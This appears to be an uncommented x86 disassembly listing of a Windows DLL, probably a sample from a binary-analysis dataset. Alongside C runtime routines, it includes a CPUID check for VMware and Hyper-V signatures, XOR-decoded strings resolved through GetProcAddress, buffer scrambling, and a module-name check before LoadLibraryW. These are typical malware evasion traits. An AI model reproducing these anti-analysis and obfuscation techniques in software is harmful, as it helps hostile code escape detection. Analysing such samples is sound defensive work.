xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
call sub_1007abf7
mov edi eax
xor esi esi
mov [ ebp + 0x8 ] edi
cmp edi esi
jne r-xdata
mov [ ebp - 0x1c ] esi
xor eax eax
mov eax ebx
call sub_1007aa03
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_10079a10
mov ecx [ ebp - 0x1c ]
add esp 0xc
imul ecx ecx 0x30
mov [ ebp - 0x20 ] esi
lea esi [ ecx + rw-data ]
mov [ ebp - 0x1c ] esi
jmp r-xdata
inc [ ebp - 0x1c ]
add eax 0x30
cmp eax 0xf0
jb r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10024145
leave
retn
cmp [ esi ] 0x0
jne r-xdata
cmp [ eax + rw-data ] edi
je r-xdata
cmp edi 0xfde8
je r-xdata
mov al [ esi + 0x1 ]
test al al
je r-xdata
mov esi [ ebp - 0x1c ]
inc [ ebp - 0x20 ]
add esi 0x8
cmp [ ebp - 0x20 ] 0x4
mov [ ebp - 0x1c ] esi
jb r-xdata
or eax 0xffffffff
cmp edi 0xfde9
je r-xdata
movzx edi [ esi ]
movzx eax al
jmp r-xdata
mov eax edi
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] 0x1
call sub_1007a9d4
push 0x6
mov [ ebx + 0xc ] eax
lea eax [ ebx + 0x10 ]
lea ecx [ ecx + rw-data ]
pop edx
movzx eax di
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
cmp edi eax
jbe r-xdata
mov si [ ecx ]
mov [ eax ] si
add ecx 0x2
add eax 0x2
dec edx
jne r-xdata
mov esi ebx
call sub_1007aa67
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
push edi
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x20 ]
mov al [ eax + rw-data ]
or [ ebx + edi + 0x1d ] al
movzx eax [ esi + 0x1 ]
inc edi
mov edi [ ebp + 0x8 ]
add esi 0x2
xor eax eax
jmp r-xdata
cmp [ rw-data ] esi
jne r-xdata
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_10079a10
xor edx edx
inc edx
add esp 0xc
mov [ ebx + 0x4 ] edi
mov [ ebx + 0xc ] esi
cmp [ ebp - 0x18 ] edx
jbe r-xdata
mov [ ebx + 0x8 ] esi
cmp [ ebp - 0x12 ] 0x0
je r-xdata
lea eax [ ebx + 0x1e ]
mov ecx 0xfe
lea esi [ ebp - 0x11 ]
or [ eax ] 0x8
inc eax
dec ecx
jne r-xdata
mov eax [ ebx + 0x4 ]
call sub_1007a9d4
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] edx
jmp r-xdata
movzx eax [ esi - 0x1 ]
movzx ecx cl
jmp r-xdata
xor eax eax
movzx ecx ax
mov eax ecx
shl ecx 0x10
or eax ecx
lea edi [ ebx + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
cmp eax ecx
jbe r-xdata
or [ ebx + eax + 0x1d ] 0x4
inc eax
add esi 0x2
cmp [ esi - 0x1 ] 0x0
jne r-xdata
mov cl [ esi ]
test cl cl
je r-xdata
sub_10062110
push ebp
mov ebp esp
sub esp 0xc
push ebx
mov eax 0x40000000
cpuid
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0xc ]
pop ebx
cmp eax 0x61774d56
jne r-xdata
cmp eax 0x70726c20
jne r-xdata
cmp [ ebp - 0x4 ] 0x4d566572
jne r-xdata
xor eax eax
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x4 ] 0x68797065
jne r-xdata
cmp [ ebp - 0x8 ] 0x65726177
jne r-xdata
cmp [ ebp - 0x8 ] 0x72762020
jne r-xdata
mov eax 0x1
mov esp ebp
pop ebp
retn
mov eax 0x1
mov esp ebp
pop ebp
retn
sub_10062175
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push ebx
mov ebx [ ebp + 0x10 ]
test ebx ebx
jne r-xdata
push esi
cmp ebx 0x4
jb r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
lea esi [ ebx - 0x4 ]
test esi esi
je r-xdata
pop ebx
leave
retn
cmp esi ebx
jb r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov dl [ eax ]
test dl dl
je r-xdata
xor eax eax
movzx eax [ eax - 0x4 ]
movzx ecx [ ecx - 0x4 ]
jmp r-xdata
cmp dl [ ecx - 0x4 ]
jne r-xdata
movzx eax [ eax ]
movzx ecx [ ecx ]
cmp dl [ ecx ]
jne r-xdata
sub eax ecx
jmp r-xdata
mov dl [ eax - 0x3 ]
test dl dl
je r-xdata
pop esi
inc eax
inc esi
inc ecx
movzx eax [ eax - 0x3 ]
movzx ecx [ ecx - 0x3 ]
jmp r-xdata
cmp dl [ ecx - 0x3 ]
jne r-xdata
mov dl [ eax - 0x2 ]
test dl dl
je r-xdata
movzx eax [ eax - 0x2 ]
movzx ecx [ ecx - 0x2 ]
jmp r-xdata
cmp dl [ ecx - 0x2 ]
jne r-xdata
mov dl [ eax - 0x1 ]
test dl dl
je r-xdata
movzx eax [ eax - 0x1 ]
movzx ecx [ ecx - 0x1 ]
jmp r-xdata
cmp dl [ ecx - 0x1 ]
jne r-xdata
add [ ebp - 0x4 ] 0x4
cmp [ ebp - 0x4 ] esi
jb r-xdata
mov dl [ eax ]
add eax 0x4
add ecx 0x4
test dl dl
je r-xdata
jmp r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
sub_10062235
mov edi edi
push ebp
mov ebp esp
sub esp 0x40
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x10 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x8 ]
add edi 0x14
push edi
mov [ ebp - 0x30 ] ecx
mov ecx [ ebp + 0x1c ]
push 0x0
push 0x30
mov [ ebp - 0x3c ] ecx
call sub_1003088d
add esp 0xc
push [ ebp - 0x30 ]
movzx eax ax
mov ecx esi
mov [ ebp - 0x2c ] eax
lea ebx [ ebp - 0x24 ]
call sub_100081b8
test al al
jne r-xdata
mov edi [ ebp - 0x30 ]
push edi
mov ecx esi
mov [ ebp - 0x25 ] 0x0
call sub_100081b8
test al al
jne r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
push edi
mov ecx esi
call sub_100081b8
test al al
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
movzx eax [ esi + 0x6 ]
push edi
push 0x0
push 0x2b
mov [ ebp - 0x34 ] eax
call sub_1003088d
add esp 0xc
cmp [ ebp - 0x34 ] ax
jne r-xdata
mov ecx esi
call sub_10023e65
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x25 ] 0x0
jne r-xdata
mov ax [ ebp - 0x2c ]
cmp [ esi + 0x6 ] ax
jne r-xdata
mov ecx esi
call sub_10023e65
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov [ ebp - 0x24 ] 0x2b
jmp r-xdata
mov ax [ ebp - 0x2c ]
cmp ax [ esi + 0x6 ]
ja r-xdata
mov ecx esi
call sub_10023e65
lea eax [ ebp - 0x38 ]
push eax
push 0xa
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x24 ]
xor edi edi
push eax
mov [ ebx ] 0x0
mov [ ebp - 0x38 ] edi
call sub_1002c25c
add esp 0x10
push [ ebp - 0x30 ]
mov ecx esi
mov ebx eax
call sub_100081b8
test al al
je r-xdata
lea ebx [ ebp - 0x24 ]
cmp [ ebp - 0x25 ] 0x0
je r-xdata
mov ecx esi
mov [ ebp - 0x25 ] 0x1
call sub_1005576a
push edi
mov ecx esi
call sub_100081b8
test al al
je r-xdata
movzx eax [ esi + 0x6 ]
push edi
push 0x0
push 0x2d
mov [ ebp - 0x34 ] eax
call sub_1003088d
add esp 0xc
cmp [ ebp - 0x34 ] ax
jne r-xdata
mov ecx esi
call sub_10023e65
mov ecx esi
lea ebx [ ebp - 0x23 ]
call sub_1005576a
cmp [ esi + 0x4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x24 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
inc edi
mov [ ebx ] 0x30
inc ebx
jmp r-xdata
mov [ ebp - 0x24 ] 0x2d
movzx eax [ ebp - 0x2c ]
movzx ecx [ esi + 0x6 ]
add eax 0x9
cmp ecx eax
jg r-xdata
mov ecx esi
call sub_10023e65
or edi 0x2
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp ebx [ ebp + 0x14 ]
jl r-xdata
mov al [ esi + 0x6 ]
sub al [ ebp - 0x2c ]
add al 0x30
mov [ ebx ] al
lea eax [ ebp - 0x5 ]
cmp ebx eax
jae r-xdata
mov ecx esi
call sub_10023e65
cmp [ ebp + 0x18 ] ebx
jl r-xdata
mov ecx esi
mov [ ebp - 0x25 ] 0x1
call sub_1005576a
inc ebx
mov eax [ ebp - 0x3c ]
mov [ eax ] ebx
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10024145
leave
retn
sub_10062409
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_10005296
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1006591f
pop ecx
sub_10062430
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
xor eax eax
push edi
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] al
mov eax [ ebp + 0x8 ]
push eax
push r--data
mov ecx 0x9
lea edi [ ebp - 0x10 ]
mov [ ebp - 0x14 ] 0x0
call sub_10052b20
mov eax edi
add esp 0x8
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
lea edx [ eax + 0x1 ]
pop edi
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea ecx [ ebp - 0x10 ]
push ecx
mov ecx esi
call sub_10043190
mov ecx [ ebp - 0x4 ]
xor ecx ebp
mov eax esi
call sub_10024145
mov esp ebp
pop ebp
retn
sub_100624b0
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
push esi
push 0xffffffff
push 0x0
push eax
push 0x0
mov [ ebp - 0x4 ] 0x0
call sub_100215b0
mov esi [ ebp + 0x8 ]
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
push eax
mov ecx esi
mov [ esi ] 0x0
call sub_1000adb0
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
sub_100624f1
mov edi edi
push ebp
mov ebp esp
sub esp 0x54
movsx eax [ ebp + 0x28 ]
push esi
mov esi [ ebp + 0x20 ]
push edi
xor edi edi
add eax 0xffffffbf
mov [ ebp - 0x4 ] edi
cmp eax 0x38
ja r-xdata
or [ esi ] 0x2
movzx eax [ eax + lookup_table_100627dd ]
jmp [ eax * 4 + jump_table_10062781 ]
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
pop edi
mov [ eax + 0x4 ] ecx
pop esi
leave
retn 0x28
or [ esi ] 0x1
push [ ebp + 0x24 ]
mov eax [ ecx ]
push esi
push [ ebp + 0x1c ]
lea edx [ ebp - 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edx
call [ eax + 0x10 ]
mov eax [ ebp - 0xc ]
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x8 ]
push [ ebp + 0x24 ]
mov eax [ ecx ]
push esi
push [ ebp + 0x1c ]
lea edx [ ebp - 0x14 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edx
call [ eax + 0x14 ]
mov eax [ ebp - 0x14 ]
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x10 ]
jmp r-xdata
push r--data
lea eax [ ebp - 0x24 ]
lea eax [ ebp - 0x4 ]
push eax
push 0x63
push edi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ecx
call sub_1005c3b0
or [ esi ] eax
add esp 0x18
test [ esi ] 0x2
jne r-xdata
mov eax [ ebp + 0x24 ]
add eax 0xc
push eax
push 0x1f
push r--data
lea eax [ ebp - 0x2c ]
jmp r-xdata
mov eax [ ebp + 0x24 ]
add eax 0x8
push eax
push 0x17
mov eax [ ebp + 0x24 ]
add eax 0x8
push eax
push 0xb
jmp r-xdata
mov eax [ ebp + 0x24 ]
add eax 0x1c
push eax
push 0x16e
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
push 0xc
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ecx
call sub_1005c3b0
or [ esi ] eax
add esp 0x18
test [ esi ] 0x2
jne r-xdata
mov eax [ ebp + 0x24 ]
add eax 0x4
push eax
push r--data
lea eax [ ebp - 0x34 ]
jmp r-xdata
push r--data
push edi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_1000df21
add esp 0x10
cmp eax edi
jl r-xdata
push r--data
lea eax [ ebp - 0x3c ]
jmp r-xdata
push r--data
lea eax [ ebp - 0x44 ]
jmp r-xdata
push [ ebp + 0x24 ]
jmp r-xdata
push r--data
lea eax [ ebp - 0x4c ]
jmp r-xdata
mov eax [ ebp + 0x24 ]
add eax 0x1c
push eax
push 0x35
jmp r-xdata
mov eax [ ebp + 0x24 ]
add eax 0x18
push eax
push 0x6
jmp r-xdata
push r--data
lea eax [ ebp - 0x54 ]
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
push 0x63
push edi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ecx
call sub_1005c3b0
or [ esi ] eax
add esp 0x18
test [ esi ] 0x2
jne r-xdata
push [ ebp + 0x24 ]
mov eax [ ecx ]
push esi
push [ ebp + 0x1c ]
lea edx [ ebp - 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edx
call [ eax + 0x18 ]
mov eax [ ebp - 0x1c ]
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x18 ]
jmp r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1003b7cf
test al al
je r-xdata
mov [ ebp + 0x10 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
add eax 0xffffffed
imul eax eax 0x64
push [ ebp + 0x24 ]
push esi
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_10003c04
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
jmp r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ecx
call sub_1005c3b0
add esp 0x18
or [ esi ] eax
jmp r-xdata
push edi
jmp r-xdata
push 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x24 ]
dec eax
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov ecx [ ebp + 0x24 ]
imul eax eax 0xc
add [ ecx + 0x8 ] eax
jmp r-xdata
push 0x3b
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp eax 0x45
jge r-xdata
mov ecx [ ebp + 0x24 ]
mov [ ecx + 0x14 ] eax
jmp r-xdata
add eax 0x64
jmp r-xdata
sub_10062830
push ebp
mov ebp esp
sub esp 0x118
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push 0x190
push 0x0
push rw-data
call sub_10079a10
mov ecx [ r--data ]
add esp 0xc
xor eax eax
nop
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x7d
and edx 0xff
mov [ ebp + eax * 2 - 0xc0 ] dx
inc eax
cmp eax 0xc
jb r-xdata
push edi
lea ecx [ ebp - 0xc0 ]
xor eax eax
push ecx
mov [ ebp - 0xa8 ] ax
call [ GetModuleHandleW@IAT ]
mov edi eax
test edi edi
jne r-xdata
push esi
mov esi [ r--data ]
xor cl cl
xor eax eax
lea eax [ edi + 0x64 ]
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov dl [ eax + esi ]
xor dl cl
xor dl 0xdb
inc cl
mov [ ebp + eax - 0x28 ] dl
movzx eax cl
cmp eax 0xb
jb r-xdata
mov esi [ r--data ]
xor cl cl
mov [ ebp - 0x1d ] 0x0
xor eax eax
jmp r-xdata
mov dl [ eax + esi ]
xor dl cl
xor dl 0x27
inc cl
mov [ ebp + eax - 0x10 ] dl
movzx eax cl
cmp eax 0x8
jb r-xdata
mov esi [ r--data ]
xor cl cl
mov [ ebp - 0x8 ] 0x0
xor eax eax
mov dl [ eax + esi ]
xor dl cl
xor dl 0x63
inc cl
mov [ ebp + eax - 0x1c ] dl
movzx eax cl
cmp eax 0x9
jb r-xdata
mov esi [ r--data ]
xor cl cl
mov [ ebp - 0x13 ] 0x0
xor eax eax
mov dl [ eax + esi ]
xor dl cl
xor dl 0x88
inc cl
mov [ ebp + eax - 0x3c ] dl
movzx eax cl
cmp eax 0xb
jb r-xdata
mov esi [ r--data ]
xor cl cl
mov [ ebp - 0x31 ] 0x0
xor eax eax
lea esp [ esp ]
mov dl [ eax + esi ]
xor dl cl
xor dl 0x62
inc cl
mov [ ebp + eax - 0x5c ] dl
movzx eax cl
cmp eax 0xc
jb r-xdata
mov esi [ r--data ]
xor cl cl
mov [ ebp - 0x50 ] 0x0
xor eax eax
mov dl [ eax + esi ]
xor dl cl
xor dl 0x95
inc cl
mov [ ebp + eax - 0x6c ] dl
movzx eax cl
cmp eax 0xc
jb r-xdata
mov esi [ r--data ]
xor cl cl
mov [ ebp - 0x60 ] 0x0
xor eax eax
mov dl [ eax + esi ]
xor dl cl
xor dl 0x65
inc cl
mov [ ebp + eax - 0x90 ] dl
movzx eax cl
cmp eax 0x13
jb r-xdata
mov esi [ r--data ]
xor cl cl
mov [ ebp - 0x7d ] 0x0
xor eax eax
nop
mov dl [ eax + esi ]
xor dl cl
xor dl 0xbe
inc cl
mov [ ebp + eax - 0x4c ] dl
movzx eax cl
cmp eax 0xc
jb r-xdata
mov esi [ GetProcAddress@IAT ]
lea eax [ ebp - 0x28 ]
push eax
push edi
mov [ ebp - 0x40 ] 0x0
call esi
lea ecx [ ebp - 0x10 ]
push ecx
push edi
mov [ rw-data ] eax
call esi
lea edx [ ebp - 0x1c ]
push edx
push edi
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
lea eax [ ebp - 0x3c ]
push eax
push edi
call esi
lea ecx [ ebp - 0x5c ]
push ecx
push edi
mov [ rw-data ] eax
call esi
lea edx [ ebp - 0x6c ]
push edx
push edi
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
lea eax [ ebp - 0x90 ]
push eax
push edi
call esi
lea ecx [ ebp - 0x4c ]
push ecx
push edi
mov [ rw-data ] eax
call esi
mov edi [ r--data ]
mov [ rw-data ] eax
xor cl cl
xor eax eax
lea ecx [ ecx ]
mov dl [ eax + edi ]
xor dl cl
xor dl 0x6e
inc cl
mov [ ebp + eax - 0x7c ] dl
movzx eax cl
cmp eax 0xc
jb r-xdata
push ebx
lea eax [ ebp - 0x7c ]
push eax
mov [ ebp - 0x70 ] 0x0
call [ GetModuleHandleA@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
lea edi [ ebp - 0xdc ]
mov eax 0x3
call sub_10065a80
lea edi [ ebp - 0xa4 ]
mov eax 0x8
call sub_10065a80
lea edi [ ebp - 0x118 ]
mov eax 0x7
call sub_10065a80
lea edi [ ebp - 0xf8 ]
xor eax eax
call sub_10065a80
lea edi [ ebp - 0x30 ]
mov eax 0x1
call sub_10065a80
lea ecx [ ebp - 0xdc ]
push ecx
push ebx
call esi
lea edx [ ebp - 0xa4 ]
push edx
push ebx
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
lea eax [ ebp - 0x118 ]
push eax
push ebx
call esi
lea ecx [ ebp - 0xf8 ]
push ecx
push ebx
mov [ rw-data ] eax
call esi
mov edx edi
push edx
push ebx
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
mov [ rw-data ] sub_10057510
mov [ rw-data ] sub_1001cae0
mov [ rw-data ] sub_1002ed40
mov [ rw-data ] sub_100552e0
mov [ rw-data ] sub_10051690
mov [ rw-data ] sub_1005ca90
mov [ rw-data ] sub_10036a80
mov [ rw-data ] sub_1006a410
mov [ rw-data ] sub_1001b2e0
mov [ rw-data ] sub_10065b20
mov [ rw-data ] sub_10041310
mov [ rw-data ] sub_100147f0
mov [ rw-data ] sub_1004b010
mov [ rw-data ] sub_10057380
mov [ rw-data ] sub_10008f40
mov eax 0x1
lea ecx [ ecx ]
pop ebx
pop esi
mov eax 0xc8
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
pop ebx
pop esi
xor ecx ebp
pop edi
call sub_10024145
mov esp ebp
pop ebp
retn
inc eax
cmp eax 0x1d
jl r-xdata
cmp [ eax * 4 + rw-data ] 0x0
je r-xdata
xor eax eax
mov cl 0x38
xor [ eax + rw-data ] cl
inc eax
cmp eax 0x190
jb r-xdata
xor eax eax
sub_10062c00
push esi
mov esi [ eax ]
push edi
mov edi ecx
test esi esi
jne r-xdata
push ebx
mov ebx [ lstrcmpW@IAT ]
pop edi
lea eax [ esi + 0x1 ]
pop esi
retn
mov ebx [ esi ]
mov edx edi
call sub_1002aa50
mov edi [ edi ]
test edi edi
je r-xdata
mov esi [ esi + 0x4 ]
test esi esi
jne r-xdata
pop ebx
pop edi
xor eax eax
pop esi
retn
mov ebx edi
mov edi [ esi ]
call sub_1002a850
mov ecx [ edi + 0x4 ]
mov eax [ esi ]
push ecx
mov ecx [ eax + 0x4 ]
push ecx
call ebx
test eax eax
je r-xdata
pop ebx
pop edi
lea eax [ esi + 0x2 ]
pop esi
retn
sub_10062c53
push 0x38
mov eax sub_1007f481
call sub_1001bb6b
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_100688a0
mov esi [ esi + 0x14 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_1002b6c2
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_10058a63
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
call sub_10069ce0
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1003b7cf
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov [ ebx ] esi
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_1004fa89
retn 0x20
sub_10062d10
push ebp
mov ebp esp
sub esp 0xff8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
sub eax 0x0
push esi
mov esi [ ebp + 0x8 ]
je r-xdata
mov edx [ rw-data ]
push edx
call [ SetUnhandledExceptionFilter@IAT ]
mov eax [ rw-data ]
push eax
call [ SetErrorMode@IAT ]
mov eax [ rw-data ]
test eax eax
je r-xdata
dec eax
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push eax
call sub_1005cc3f
add esp 0x4
mov ecx [ ebp - 0x4 ]
xor ecx ebp
mov eax 0x1
pop esi
call sub_10024145
mov esp ebp
pop ebp
retn 0xc
push sub_1006c950
call [ SetUnhandledExceptionFilter@IAT ]
push 0x8003
mov [ rw-data ] eax
call [ SetErrorMode@IAT ]
mov [ rw-data ] eax
push 0x104
lea eax [ ebp - 0xff8 ]
push eax
push esi
mov [ rw-data ] esi
call [ GetModuleFileNameW@IAT ]
lea ecx [ ebp - 0xff8 ]
push ecx
call [ PathStripPathW@IAT ]
lea edx [ ebp - 0xbb4 ]
mov eax 0x130
call sub_10013830
push edx
lea eax [ ebp - 0xff8 ]
push eax
call [ StrCmpW@IAT ]
test eax eax
je r-xdata
push eax
call [ FreeLibrary@IAT ]
lea ecx [ ebp - 0xbb4 ]
push ecx
call [ LoadLibraryW@IAT ]
mov [ rw-data ] eax
test eax eax
je r-xdata
push edi
push 0x6720
mov [ rw-data ] esi
call sub_10035b61
mov esi eax
add esp 0x4
lea edi [ ebp - 0x830 ]
mov eax 0x89
mov [ rw-data ] esi
call sub_10009000
lea edi [ ebp - 0x380 ]
xor eax eax
call sub_10009000
lea edi [ ebp - 0x710 ]
mov eax 0x70
call sub_10009000
lea edi [ ebp - 0xcfc ]
mov eax 0x25
call sub_10009000
lea edi [ ebp - 0x5cc ]
mov eax 0x155
call sub_10009000
lea edi [ ebp - 0x9bc ]
mov eax 0x13b
call sub_10009000
lea edi [ ebp - 0x87c ]
mov eax 0x96
call sub_10009000
lea edi [ ebp - 0x7c4 ]
mov eax 0x67
call sub_10009000
lea edi [ ebp - 0xb8 ]
mov eax 0x104
call sub_10009000
lea edi [ ebp - 0xd34 ]
mov eax 0x153
call sub_10009000
lea edi [ ebp - 0xb94 ]
mov eax 0x80
call sub_10009000
lea edi [ ebp - 0x77c ]
mov eax 0xf0
call sub_10009000
lea edi [ ebp - 0x2c4 ]
mov eax 0x97
call sub_10009000
lea edi [ ebp - 0x28 ]
mov eax 0xc6
call sub_10009000
lea edi [ ebp - 0x190 ]
mov eax 0x129
call sub_10009000
lea edi [ ebp - 0xb10 ]
mov eax 0x86
call sub_10009000
lea edi [ ebp - 0xa0 ]
mov eax 0x12f
call sub_10009000
lea edi [ ebp - 0x7e8 ]
mov eax 0xf2
call sub_10009000
lea edi [ ebp - 0x104 ]
mov eax 0x111
call sub_10009000
lea edi [ ebp - 0x460 ]
mov eax 0xe8
call sub_10009000
lea edi [ ebp - 0x40 ]
mov eax 0x30
call sub_10009000
lea edi [ ebp - 0x200 ]
mov eax 0x11e
call sub_10009000
lea edi [ ebp - 0x500 ]
mov eax 0xbb
call sub_10009000
lea edi [ ebp - 0xc0c ]
mov eax 0x149
call sub_10009000
lea edi [ ebp - 0xd70 ]
mov eax 0x35
call sub_10009000
lea edi [ ebp - 0x440 ]
mov eax 0x22
call sub_10009000
lea edi [ ebp - 0x4c0 ]
mov eax 0x3f
call sub_10009000
lea edi [ ebp - 0x8f4 ]
mov eax 0xb4
call sub_10009000
lea edi [ ebp - 0x270 ]
mov eax 0x51
call sub_10009000
lea edi [ ebp - 0x300 ]
mov eax 0x135
call sub_10009000
lea edi [ ebp - 0xbe0 ]
mov eax 0xaa
call sub_10009000
lea edi [ ebp - 0x540 ]
mov eax 0x124
call sub_10009000
lea edi [ ebp - 0x944 ]
mov eax 0xbe
call sub_10009000
lea edi [ ebp - 0xb3c ]
mov eax 0x2
call sub_10009000
lea edi [ ebp - 0x584 ]
mov eax 0x20
call sub_10009000
lea edi [ ebp - 0xae4 ]
mov eax 0xd3
call sub_10009000
lea edi [ ebp - 0x8a4 ]
mov eax 0x83
call sub_10009000
lea edi [ ebp - 0x400 ]
mov eax 0xea
call sub_10009000
lea edi [ ebp - 0x8cc ]
mov eax 0x4f
call sub_10009000
lea edi [ ebp - 0x480 ]
mov eax 0xc8
call sub_10009000
lea edi [ ebp - 0x80c ]
mov eax 0x1f
call sub_10009000
lea edi [ ebp - 0x158 ]
mov eax 0x98
call sub_10009000
lea edi [ ebp - 0xd0 ]
mov eax 0x33
call sub_10009000
lea edi [ ebp - 0xc68 ]
mov eax 0x7
call sub_10009000
lea edi [ ebp - 0x4a0 ]
mov eax 0x144
call sub_10009000
lea edi [ ebp - 0x3c0 ]
mov eax 0x112
call sub_10009000
lea edi [ ebp - 0xe8 ]
mov eax 0xa6
call sub_10009000
lea edi [ ebp - 0x614 ]
mov eax 0x61
call sub_10009000
lea edi [ ebp - 0xcc8 ]
mov eax 0x28
call sub_10009000
lea edi [ ebp - 0xa34 ]
mov eax 0x3b
call sub_10009000
lea edi [ ebp - 0x854 ]
mov eax 0x13
call sub_10009000
lea edi [ ebp - 0x320 ]
mov eax 0xef
call sub_10009000
lea edi [ ebp - 0x120 ]
mov eax 0x91
call sub_10009000
lea edi [ ebp - 0xa8c ]
mov eax 0x68
call sub_10009000
